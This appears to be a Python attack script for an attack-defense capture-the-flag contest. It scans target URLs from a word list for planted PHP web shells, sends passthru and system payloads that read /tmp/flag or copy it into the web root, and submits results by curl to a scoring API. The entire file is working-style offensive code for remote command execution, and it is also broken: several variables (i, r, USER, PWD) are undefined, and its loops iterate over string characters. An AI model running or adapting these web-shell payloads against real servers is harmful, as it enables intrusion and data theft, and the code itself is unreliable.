# -*- coding: utf-8 -*-

import requests
import sys
import re
import requests
import os
import api
from functools import *

#scan = lambda url:[url + i for i in open("word.txt","r").read().split('\n') if requests.get(url+i).status_code == 200][0]

FuckShellPost = lambda url: [url + i for i in open("word.txt","r").read().split("\n") if "hackbyatd" in requests.post(url=(url + i), data={i:"echo hackbyatd;"}).text]

def GetFlagPost(url):
    try:
        return re.findall("flag\{([^}]*)\}",requests.post(url=url, data={i:"passthru(\"echo `cat /tmp/flag`\");"}).text)
    except Exception as e:
        try:
            return re.findall("flag\{([^}]*)\}",requests.post(url=url, data={i:"system(\"echo `cat /tmp/flag`\");"}).text)
        except Exception as e:
            try:
                return re.findall("flag\{([^}]*)\}",requests.post(url=url, data={i:'system("cp /tmp/flag /var/www/html/flag1");system("echo `cat /tmp/flag`"); '}).text)
            except Exception as e:
                try:
                    return re.findall("flag\{([^}]*)\}",requests.post(url=url, data={i:'passthru("cp /tmp/flag /var/www/html/flag1");system("echo `cat /tmp/flag`"); '}).text)
                except Exception as e:
                    return []

FuckShellGet = lambda url: [url + i for i in open("word.txt","r").read().split("\n") if "hackbyatd" in requests.get(url=(url + i), data={i:"echo hackbyatd;"}).text]

def GetFlagGet(url):
    try:
        return re.findall("flag\{([^}]*)\}",requests.get(url=url, data={i:"passthru(\"cat /tmp/flag\");"}).text)[0]
    except Exception as e:
        try:
            return re.findall("flag\{([^}]*)\}",requests.get(url=url, data={i:"system(\"cat /tmp/flag\");"}).text)[0]
        except Exception as e:
            try:
                return re.findall("flag\{([^}]*)\}",requests.get(url=url, data={i:'system("cp /tmp/flag /var/www/html/flag1");system("cat flag1"); '}).text)[0]
            except Exception as e:
                try:
                    return re.findall("flag\{([^}]*)\}",requests.get(url=url, data={i:'passthru("cp /tmp/flag /var/www/html/flag1");system("cat flag1"); '}).text)[0]
                except Exception as e:
                    return []

[os.system('curl -k -d "answer="' + r + ' -X POST -v --user ' + USER + ':' + PWD + ' https://ip/api/sub_answer') for us in FuckShellPost("http://" + sys.argv[1]) for u in us for f in GetFlagPost(u)]
[os.system('curl -k -d "answer="' + r + ' -X POST -v --user ' + USER + ':' + PWD + ' https://ip/api/sub_answer') for us in FuckShellGet("http://" + sys.argv[1]) for u in us for f in GetFlagGet(u)]
